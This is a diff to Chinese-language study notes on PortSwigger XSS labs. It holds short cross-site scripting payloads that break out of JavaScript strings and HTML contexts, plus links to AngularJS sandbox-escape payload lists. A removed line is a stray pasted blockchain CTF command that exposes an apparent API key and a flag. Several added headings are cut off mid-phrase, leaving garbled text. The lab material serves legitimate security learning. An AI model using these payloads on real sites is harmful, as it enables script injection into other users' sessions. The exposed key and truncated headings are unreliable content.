@@ -58,7 +58,7 @@ JS的内容直接来源于参数，应该是做了啥模板渲染的。注入js�
 %27;%0aalert(window.origin);%0ab='
 ```
 
-## Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `document.write` sink using source `location.search` inside a select element
+## Lab: [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) in `document.write` sink using source `location.search` inside a select
 
 ```js
 var stores = ["London","Paris","Milan"];
@@ -94,7 +94,7 @@ url参数在`><`中间，尖括号转义。无法逃出
 
 另外 AngularJS gadget (SSTI)还可以用来 bypass CSP 。payload 收集：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md 以及 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
 
-## xxxxxxxxxx $ cast call 0x364Ca1729564bdB0cE88301FC72cbE3dCCcC08eD "getFlag()" -r https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 --private-key <64byteskey>  | cut -c3- | xxd -r -p | (cat && printf "\x0A") 8TCP1P{4_b1t_of_f0undry_s3nd_4nd_abiCoder_w0n7_hur7_y34h}bash
+## Lab: Reflected [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
 
 ```js
 function search(path) {
@@ -354,7 +354,7 @@ document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIC
 </script><script>alert(document.domain)</script>
 ```
 
-## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+## Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into a JavaScript string with angle brackets
 
 前端渲染
 
@@ -369,7 +369,7 @@ document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIC
 \'-alert(document.domain)//
 ```
 
-## Lab: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+## Lab: [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) into `onclick` event with angle brackets and double
 
 存储型。后端渲染
 
@@ -383,7 +383,7 @@ document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIC
 http://foo?&apos;-alert(document.domain)-&apos;
 ```
 
-## Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+## Lab: Reflected XSS into a template literal with angle brackets,
 
 后端渲染，但是该转义的都转义了。
 
